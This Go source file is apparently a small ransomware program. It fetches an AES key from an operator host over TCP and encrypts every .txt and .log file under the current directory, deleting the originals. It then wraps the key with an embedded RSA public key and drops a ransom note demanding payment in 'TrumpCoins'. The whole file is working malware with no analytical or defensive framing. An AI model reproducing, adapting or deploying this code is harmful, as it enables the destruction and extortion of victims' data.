package main

import (
	"os"
	"net"
	"fmt"
	"time"
	"path/filepath"
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"crypto/rsa"
	"crypto/x509"
	"crypto/sha256"
	"encoding/pem"
	"encoding/base64"
	"io/ioutil")

func encryptFile(filePath string, key []byte) error {
	plaintext, err := ioutil.ReadFile(filePath)
	if err != nil {
		return err
	}

	block, err := aes.NewCipher(key)
	if err != nil {
		return err
	}

	nonce := make([]byte, 12) // 12 bytes for AES-GCM nonce
	if _, err := rand.Read(nonce); err != nil {
		return err
	}

	aesGCM, err := cipher.NewGCM(block)
	if err != nil {
		return err
	}
	ciphertext := aesGCM.Seal(nil, nonce, plaintext, nil)

	encFilePath := filePath + ".rdg"
	encData := append(nonce, ciphertext...)
	if err := ioutil.WriteFile(encFilePath, encData, 0644); err != nil {
		return err
	}

	fmt.Printf("File %s encrypted.\n", filePath)
	return nil
}

func rsaEncrypt(plaintext []byte, publicKeyPEM string) ([]byte, error) {
	block, _ := pem.Decode([]byte(publicKeyPEM))
	if block == nil {
		return nil, fmt.Errorf("failed to parse RSA public key")
	}
	
	rsaPubKey, err := x509.ParsePKCS1PublicKey(block.Bytes)

	ciphertext, err := rsa.EncryptOAEP(
		sha256.New(), 
		rand.Reader, 
		rsaPubKey, 
		plaintext, 
		nil,
	)
	if err != nil {
		return nil, err
	}
	return ciphertext, nil
}

func startClient() {
	if len(os.Args) < 2 {
		fmt.Println("Exit")
	}

	host := os.Args[1] 
	port := 12345
	addr := fmt.Sprintf("%s:%d", host, port)

	conn, err := net.Dial("tcp", addr)
	if err != nil {
		fmt.Println("Failed to connect:", err)
		return
	}
	defer conn.Close()

	buf := make([]byte, 1024)
	n, err := conn.Read(buf)
	if err != nil {
		fmt.Println("Failed to receive AES key:", err)
		return
	}
	aesKey, err := base64.StdEncoding.DecodeString(string(buf[:n]))
	if err != nil {
		fmt.Println("Failed to decode AES key:", err)
		return
	}
	for i := range buf {
	    buf[i] = 0
	}

	extensions := []string{".txt", ".log"}
	filepath.Walk(".", func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return err
		}
		if !info.IsDir() {
			for _, ext := range extensions {
				if filepath.Ext(path) == ext {
					if err := encryptFile(path, aesKey); err != nil {
						fmt.Println("Failed to encrypt file:", err)
					} else {
						os.Remove(path)
					}
				}
			}
		}
		return nil
	})

	publicKey := `
-----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEAu2D49XqKWO/pqvwXGbmZSfUqNpPtyNZZ3QlRf+Q+JiCt3649/pIX
46w4fLdjvWEl8kF6DhGxjh43LLeaQJaVDL1V3Pvp8WuKHrHn7EzG9T/JB4GIFCgC
em7f7QZx2yCxBCDNCiPgi/YLzZAS6GNPvIbdbynmtuimJB9psr8nCVO5a8qhsS+x
u+W+24NIBeYxszx3yy6xeB6ysLNvgNDrvqY52cIAXusS+o0Qb9doYwmQVBLkU/K5
JjRqgjxs80mfSOJe7ZL/rR/rHEJoiqV7fN6X88xll4NoXdpl7S5MnSXMf0wtMZ3j
Jyd+z9VjWzaPdG61g9iLWnwe68UqV1ytCQIDAQAB
-----END RSA PUBLIC KEY-----`

	encrypted, err := rsaEncrypt(aesKey, publicKey)
	if err != nil {
		fmt.Println("Failed to encrypt key:", err)
		return
	}
	fmt.Printf("Encrypted key RSA: %s\n", base64.StdEncoding.EncodeToString(encrypted))

	for i := range aesKey {
	    aesKey[i] = 0
	}

	msg := "Your files have been encrypted! You need to pay 100.000 TrumpCoins to get the decryption key."
	err = ioutil.WriteFile("_README_.md", []byte(msg), 0644)
	if err != nil {
		panic(err)
	}

	time.Sleep(10000 * time.Second)
}

func main() {
	startClient()
}